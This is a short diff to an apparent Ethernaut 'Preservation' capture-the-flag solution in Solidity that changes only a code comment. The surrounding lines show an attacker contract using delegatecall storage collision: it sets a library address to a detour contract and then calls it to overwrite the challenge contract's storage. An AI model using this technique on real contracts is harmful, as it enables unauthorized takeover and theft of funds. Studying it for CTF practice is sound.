@@ -32,7 +32,7 @@ contract PreservationAttacker {
       // which executes in challenge contract's context (uses same storage)
       challenge.setFirstTime(uint256(address(detour)));
 
-      // 2. now make challenge call setTime of our detour
+      // 2. now make challenge contract call setTime function of our detour
       challenge.setFirstTime(0);
     }
 }
